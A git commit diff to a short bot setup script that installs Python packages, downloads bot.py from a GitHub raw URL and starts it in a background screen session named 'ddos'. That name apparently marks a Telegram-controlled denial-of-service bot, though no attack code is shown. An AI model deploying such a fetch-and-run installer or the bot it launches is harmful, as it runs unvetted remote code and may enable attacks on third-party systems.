0962da06b02bbb080e635f1ac94b808f950f87aa
ZeronX <160329349+zeronxdev@users.noreply.github.com>
2024-04-10 20:43:48 +0700

    Update bot.sh

--- bot/bot.sh
+++ bot/bot.sh
@@ -1,9 +1,10 @@
 yum update -y && apt update -y
-yum install python3 -t && apt install python3 -y
+yum install python3 -y && apt install python3 -y
 pip3 install telegram
 pip3 install psutil
 pip3 install python-telegram-bot==13.7
 pip3 install bs4
 pip3 install requests
 mkdir bot && cd bot
-wget 
+curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/bot.py -o bot.py
+screen -dmS ddos python3 bot.py
